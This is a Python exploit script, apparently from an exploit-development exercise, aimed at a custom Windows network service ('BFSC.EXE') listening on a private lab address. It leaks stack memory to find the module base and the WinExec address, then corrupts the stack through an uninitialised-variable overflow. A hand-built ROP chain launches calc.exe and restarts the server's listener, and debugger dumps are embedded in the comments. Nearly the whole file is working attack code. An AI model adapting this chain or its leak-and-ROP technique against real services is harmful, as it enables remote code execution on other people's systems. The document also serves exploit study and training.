import socket 
import struct
import hexdump
import random
import time

PAYLOAD_SIZE = 0x340 
#PAYLOAD_SIZE = 0xF00-0x14 

CONNECTION_COUNT = 0

def tohex(val, nbits):
  return hex((val + (1 << nbits)) % (1 << nbits))

def init_sock(bWait=True, iTime=0.2):
	global CONNECTION_COUNT
	s = socket.socket()
	#s.settimeout(3000)
	s.connect(("192.168.213.128", 12321))
	CONNECTION_COUNT = CONNECTION_COUNT + 1
	if bWait:
		time.sleep(iTime)
	return s


def echo_hello(msg):

	print("sending hello msg")
	#t = random.uniform(0, 1.5)
	s = init_sock(True)
	
	data = msg	
	
	data_size = len(data)
	header    = b'BFS.' + struct.pack("<L", data_size)

	time.sleep(random.random()+1)
	s.send(header)
	time.sleep(random.random()+1)
	s.send(data)
	time.sleep(random.random()+1)
	buff = s.recv(0x1000)
	if len(buff) == data_size:
		print(buff)
		
	time.sleep(random.random()+1)
	s.close()
	
	return buff
	



def leak_data():

	s = init_sock()
		
	data  = b'\x90' * 0xD0
	data += b'AAAABBBBCCCCDDDDEEEEFFFFHHHHIIIIJJJJKKKKLLLL'
	data += struct.pack("<L", 0x00000F00)

	# g_stack_depth (DWORD) 
	# g_stack_array (QWORD ARRAY: E1, E2)

	data_size = len(data)
	header    = b'BFS.' + struct.pack("<L", 0xFF)

	s.send(header)
	s.send(data)

	s.recv(0x1000)

	s.close()
	
	s = init_sock()
		
	data  = b'\x90' * 0xD0	

	data_size = len(data)
	#print(data_size)
	header    = b'BFS.' + struct.pack("<L", 0x100)

	s.send(header)
	s.send(data)

	buff = s.recv(0x1000)
	#print(buff)
	s.close()		
		
	return buff[0x100:]

def clean_uninit():	

	s = init_sock()

	data  = b'\x00' * 0x100

	data_size = len(data)
	
	header    = b'BFS.' + struct.pack("<L", 0xFF)

	s.send(header)
	time.sleep(random.random()+0.1)
	s.send(data)
	time.sleep(random.random()+0.1)
	buff = s.recv(0x1000)
	s.close()

	
def clean_uninit2():
	s = init_sock()

	data  = b'\x90' * 0xD0
	data += b'AAAABBBBCCCCDDDDEEEEFFFFHHHHIIIIJJJJKKKKLLLL'
	data += struct.pack("<L", 0x00000000)

	# g_stack_depth (DWORD) 
	# g_stack_array (QWORD ARRAY: E1, E2)

	data_size = len(data)
	#print(data_size)
	header    = b'BFS.' + struct.pack("<L", 0xFF)

	s.send(header)
	time.sleep(random.random()+0.1)
	s.send(data)
	time.sleep(random.random()+0.1)
	buff = s.recv(0x1000)

	s.close()


def get_msg():
	data = b'https://distintas.net/camila-nicole'
	#padding = b"0x61" * random.randint(0, 0xD0 - len(data))
	#msg = data + padding
	return data
	
def confirm_cleanup():
	print("Attempting to clean the uninit var")
	
	resp = echo_hello(get_msg())
	
	while len(resp) > 0x200:
		print("cleanup-1")
		clean_uninit()
		
		print("cleanup-2")
		clean_uninit2()	
			
		try:			
			resp = echo_hello(get_msg())
		except:
			pass
		

def prepare_for_corruption():
	#for i in range(2):
	s = init_sock()

	data      = b'\x90' * 0xD0
	data += b'AAAABBBBCCCCDDDDEEEEFFFFHHHHIIIIJJJJKKKKLLLL'



	data += struct.pack("<L", 0x0000014 + PAYLOAD_SIZE)

	# g_stack_depth (DWORD) 
	# g_stack_array (QWORD ARRAY: E1, E2)


	data_size = len(data)
	#print(data_size)
	header    = b'BFS.' + struct.pack("<L", 0xFF)

	s.send(header)
	time.sleep(0.2)
	s.send(data)
	time.sleep(0.2)
	s.recv(0x1000)

	s.close()
	
	
def prepare_for_socket_leak():	
	s = init_sock()

	data      = b'\xFF' * 0xD0
	data += b'AAAABBBBCCCCDDDDEEEEFFFFHHHHIIIIJJJJKKKKLLLL'

	# 0x21 coz 0xFF is what we're sending in the header
	data += struct.pack("<L", 0x000020) # uninit val 

	# g_stack_depth (DWORD) 
	# g_stack_array (QWORD ARRAY: E1, E2)


	data_size = len(data)
	#print(data_size)
	header    = b'BFS.' + struct.pack("<L", 0xFF)

	s.send(header)
	s.send(data)

	#print(s.recv(0x1000))

	s.close()
	
	
def clean2():
	
	for i in range(2):
		s = init_sock()

		data  = b'\x90' * 0x100
		
		# g_stack_depth (DWORD) 
		# g_stack_array (QWORD ARRAY: E1, E2)

		data_size = len(data)
		#print(data_size)
		header    = b'BFS.' + struct.pack("<L", 0x100)

		s.send(header)
		s.send(data)

		buff = s.recv(0x1000)

		s.close()
		
	for i in range(2):
		s = init_sock()

		data  = b'\x90' * 0x10
		
		# g_stack_depth (DWORD) 
		# g_stack_array (QWORD ARRAY: E1, E2)

		data_size = len(data)
		#print(data_size)
		header    = b'BFS.' + struct.pack("<L", 0x1000)

		s.send(header)
		s.send(data)

		buff = s.recv(0x1000)

		s.close()
		
	
	for i in range(2):
		s = init_sock()

		data  = b'\x90' * 0xD0
		data += b'AAAABBBBCCCCDDDDEEEEFFFFHHHHIIIIJJJJKKKKLLLL'
		data += struct.pack("<L", 0x00000000)

		# g_stack_depth (DWORD) 
		# g_stack_array (QWORD ARRAY: E1, E2)

		data_size = len(data)
		#print(data_size)
		header    = b'BFS.' + struct.pack("<L", 0xFF)

		s.send(header)
		s.send(data)

		buff = s.recv(0x1000)

		s.close()
		
	
def leak_socket():
	s = init_sock()
	
	data = b'C' * 0x100
	data += struct.pack("<L", 0xFFFFFF01) # This is for uninit and also for g_stack_depth
	data += b'C' * (0x120 - len(data))
	
	data_size = len(data)
	header    = b'BFS.' + struct.pack("<L", 0x100)

	s.send(header)	
	s.send(data)

	hexdump.hexdump(s.recv(0x1000))

	s.close()


def exploit(bfsc_base, winexec_addr):
	global CONNECTION_COUNT
	s = init_sock()
	
	# ROP HERE (0x100 max!) (or less) -> change the space above
	FILLER = b'\xEE\xEE\xEE\xEE\xEE\xEE\xEE\xEE'

	data      = b'\xCC' * 0x100 # SIZE SPECIFIED IN THE HEADER
	
	
	data      += struct.pack("<L", 0xFFFFFF01)
	data      += struct.pack("<Q", 0xC4F3B4B3C4F3B4B3)
	
	#data      += struct.pack("<Q", 0x4242424242424242)
	
	
	rop  = struct.pack("<Q", bfsc_base + 0x684D) # pop rbx ; ret
	
	rop += FILLER
	rop += struct.pack("<L", 0xEEEEEEEE)
	
	rop += struct.pack("<Q", bfsc_base + 0xD9E0) # POINTER TO DATA QWORD --> GOES INTO RBX
	
	rop += struct.pack("<Q", bfsc_base + 0x8c0f) # xor rax, rax ; ret   # CLEAR RAX	
	rop += struct.pack("<Q", bfsc_base + 0x6846) # mov qword ptr [rbx], rax ; add rsp, 0x20 ; pop rbx ; ret
	rop += FILLER 
	rop += FILLER 
	rop += FILLER 
	rop += FILLER 
	rop += struct.pack("<Q", 0x0) # RBX Value (popped)
	rop += struct.pack("<Q", bfsc_base + 0x5c50) # mov rcx, qword [0x000000014000D9E0] ; xor eax, eax ; or rcx, 0x01 ; cmp qword [0x000000014000F7F0], rcx ; sete al ; ret ; # THIS CLEARS RCX and then increments it to 1.
	rop += struct.pack("<Q", bfsc_base + 0x7cc8) # mov rax, r11 ; ret # STACK Value goes into RAX
	rop += struct.pack("<Q", bfsc_base + 0x1aa5) # pop rdi ; ret
	
	
	'''
	0:000> db rsp L?0x100
	00000000`008ff6e8  2b 19 14 c0 f7 7f 00 00-ff ff 00 00 00 00 00 00  +...............
	00000000`008ff6f8  ff ff 00 00 00 00 00 00-0f 5c 14 c0 f7 7f 00 00  .........\......
	00000000`008ff708  00 72 e6 fa f9 7f 00 00-30 30 30 30 30 30 30 30  .r......00000000
	00000000`008ff718  37 13 37 13 37 13 37 13-37 13 37 13 37 13 37 13  7.7.7.7.7.7.7.7.
	00000000`008ff728  63 61 6c 63 2e 65 78 65-00 00 00 00 00 00 00 00  calc.exe........
	00000000`008ff738  ee ee ee ee ee ee ee ee-ee ee ee ee ee ee ee ee  ................
	00000000`008ff748  ee ee ee ee ee ee ee ee-ee ee ee ee ee ee ee ee  ................
	00000000`008ff758  ee ee ee ee ee ee ee ee-ee ee ee ee ee ee ee ee  ................
	00000000`008ff768  ee ee ee ee 00 00 00 00-00 00 00 00 00 00 00 00  ................
	00000000`008ff778  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
	00000000`008ff788  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
	00000000`008ff798  34 70 e1 fa f9 7f 00 00-00 00 00 00 00 00 00 00  4p..............
	00000000`008ff7a8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
	00000000`008ff7b8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
	00000000`008ff7c8  51 26 7c fb f9 7f 00 00-00 00 00 00 00 00 00 00  Q&|.............
	00000000`008ff7d8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
	0:000> ? 00000000`008ff728 - eax
	Evaluate expression: 1096 = 00000000`00000448
	0:000> ? 00000000`008ff728 - eax - 1
	Evaluate expression: 1095 = 00000000`00000447
	'''
	
	#rop += struct.pack("<Q", 0x00000000000046f) # RDI VALUE
	rop += struct.pack("<Q", 0x00000000000059f) # RDI VALUE
	
	
	rop += struct.pack("<Q", bfsc_base + 0x5c15) # add eax, edi ; ret # result into rax	
	rop += struct.pack("<Q", bfsc_base + 0x192b) # push rax ; pop rdi ; pop rbx ; pop rbp ; ret  # PUT IT BACK INTO RDI
	rop += struct.pack("<Q", 0x000000000000FFFF) # RBX VALUE
	rop += struct.pack("<Q", 0x000000000000FFFF) # RBP VALUE
	
	rop += struct.pack("<Q", bfsc_base + 0x5c0f) # add ecx, edi ; ret  # RCX = RDI
	# The stack is shifted.. 
	
	rop += struct.pack("<Q", bfsc_base + 0x1aa5) # pop rdi ; ret
	rop += struct.pack("<Q", 0x10)  # RDI VALUE
	rop += struct.pack("<Q", bfsc_base + 0x5bfd) # add esp, edi ; ret
	rop += FILLER
	rop += FILLER

	rop += struct.pack("<Q", winexec_addr)
	
	'''
	Context after winexec
	
	0:000> r
	rax=0000000000000000 rbx=000000000000ffff rcx=39687582a5b70000
	rdx=0000000000000000 rsi=0000000000000000 rdi=0000000000000010
	rip=00007ff9fae673d5 rsp=000000000133f728 rbp=000000000000ffff
	 r8=0000000000000000  r9=0000000000000001 r10=0000000001500000
	r11=000000000133f720 r12=0000000000000000 r13=0000000000000000
	r14=0000000000000000 r15=0000000000000000
	iopl=0         nv up ei pl zr na po nc
	cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
	KERNEL32!WinExec+0x1d5:
	00007ff9`fae673d5 c3              ret
	'''
	####################
	
	## Restore Server Socket in the correct stack position

	rop += struct.pack("<Q", bfsc_base + 0x7cc8) # mov rax, r11 ; ret # STACK Value goes into RAX

	rop += struct.pack("<Q", bfsc_base + 0x23fc) # add esp, 0x20 ; pop rdi ; ret
	
	## Garbage consumed by winexec?
	rop += struct.pack("<Q", 0xFAFAFAFAFAFAFAFA)
	rop += struct.pack("<Q", 0xFAFAFAFAFAFAFAFA)
	rop += struct.pack("<Q", 0xFAFAFAFAFAFAFAFA)
	rop += struct.pack("<Q", 0xFAFAFAFAFAFAFAFA)
	
	rop += struct.pack("<Q", 0xf0 + 0x20 + 0x38 )  # RDI VALUE	

	rop += struct.pack("<Q", bfsc_base + 0x5c15) # add eax, edi ; ret # result into rax	
	# RAX should now point to the 0x5555555555555555 below!
	
	rop += struct.pack("<Q", bfsc_base + 0x192b) # push rax ; pop rdi ; pop rbx ; pop rbp ; ret  # PUT IT BACK INTO RDI
	rop += struct.pack("<Q", 0x0) # 0 into RBX
	rop += struct.pack("<Q", 0x0) # 0 into RBP (not needed)
	
	rop += struct.pack("<Q", bfsc_base + 0x5c03) # add ebx, edi ; ret
	
	# put 0 into rcx
	rop += struct.pack("<Q", bfsc_base + 0x5c50) # mov rcx, qword [0x000000014000D9E0] ; xor eax, eax ; or rcx, 0x01 ; cmp qword [0x000000014000F7F0], rcx ; sete al ; ret ; # THIS CLEARS RCX and then increments it to 1.
	rop += struct.pack("<Q", bfsc_base + 0x1aa5) # pop rdi ; ret
	rop += struct.pack("<Q", 0x1)  # RDI VALUE	
	rop += struct.pack("<Q", bfsc_base + 0x5c0f) # add ecx, edi ; ret  # RCX = RDI
	# RDX and R8 are both 0
	rop += struct.pack("<Q", bfsc_base + 0x5c09) # add edx, edi ; ret # SET RDX to 1
	rop += struct.pack("<Q", bfsc_base + 0x1110) # BFSC.EXE::StartListener!!!!
	# At the end, we have the new socket created into RCX
	
	
	rop += struct.pack("<Q", bfsc_base + 0x23fc) # add esp, 0x20 ; pop rdi ; ret
	rop += struct.pack("<Q", 0xFAFAFAFAFAFAFAFA)
	rop += struct.pack("<Q", 0xFAFAFAFAFAFAFAFA)
	rop += struct.pack("<Q", 0xFAFAFAFAFAFAFAFA)
	rop += struct.pack("<Q", 0xFAFAFAFAFAFAFAFA)
	rop += struct.pack("<Q", int(tohex( -((CONNECTION_COUNT + 9) & 0xFC) , 64), 16))  # RDI VALUE	
	
	rop += struct.pack("<Q", bfsc_base + 0x46E2) # mov rax, rcx; ret
	
	# Adjust the socket to match the original server socket	
	rop += struct.pack("<Q", bfsc_base + 0x5c15) # add eax, edi ; ret # result into rax	
	rop += struct.pack("<Q", bfsc_base + 0x6846) # mov qword ptr [rbx], rax ; add rsp, 0x20 ; pop rbx ; ret
	rop += FILLER 
	rop += FILLER 
	rop += FILLER 
	rop += FILLER 
	rop += struct.pack("<Q", 0x0) # RBX Value (popped)
	
	####################
	# re-alsign the stack again
	rop += struct.pack("<Q", bfsc_base + 0x188a)  # add esp, 0x10 ; ret
	rop += FILLER 
	rop += FILLER 
	###########################
	
	
	
	
	
	###########################
	
	#rop += struct.pack("<Q", bfsc_base + 0x1653 ) # call into the main again
	rop += struct.pack("<Q", bfsc_base + 0x15A3 ) # call into the accept again
	
	rop += struct.pack("<Q", 0x1111111111111111) # separator
	rop += struct.pack("<Q", 0x2222222222222222) # separator
	rop += struct.pack("<Q", 0x3333333333333333) # separator
	rop += struct.pack("<Q", 0x4444444444444444) # separator
	rop += struct.pack("<Q", 0x5555555555555555) # separator <-- here goes the server socket?
	
	#rop += b'cmd.exe\x00'
	rop += b'calc.exe'
	rop += struct.pack("<Q", 0x0) # NULL TERMINATOR?


	rop  += b'\xEE' * (PAYLOAD_SIZE - len(rop))
	
	
	data += rop
	
	
	 
	 #0x0000000140005c15 : add eax, edi ; ret
		
		
	#rop += struct.pack("<Q", bfsc_base + 0x188a)  # add esp, 0x10 ; ret
	#rop += struct.pack("<Q", bfsc_base + 0x188a)  # add esp, 0x10 ; ret << THIS IS THE ONE HIT
	#struct.pack("<Q", bfsc_base + 0x5c03) # add ebx, edi ; ret

	# 0x000000014000188a : add esp, 0x10 ; ret


	data_size = len(data)
	header    = b'BFS.' + struct.pack("<L", 0x100)

	s.send(header)
	
	s.send(data)

	#print(s.recv(0x1000))

	s.close()

def main():
	

	leak = leak_data()[32:]
	while (len(leak) < 0xE00):
	    leak = leak_data()[32:]
		
	ret0 = struct.unpack("<Q", leak[0:8])[0]
	ret1 = struct.unpack("<Q", leak[8:16])[0]
	ret2 = struct.unpack("<Q", leak[16:24])[0]
	ret3 = struct.unpack("<Q", leak[24:32])[0]
	
	bfsc_base = ret0 & 0xFFFFFFFFFFFF0000
	
	print(hex(ret0))
	print(hex(ret1))
	print(hex(ret2))
	print(hex(ret3))
	
	hexdump.hexdump(leak)
	
	winexec_addr = struct.unpack("<Q", leak[0x7f8:0x800])[0]
	print(hex(winexec_addr))
	
	confirm_cleanup()	
	
	prepare_for_corruption()
	exploit(bfsc_base, winexec_addr)
	


if __name__ == "__main__":
	#clean_uninit2()
	#echo_hello()
	main()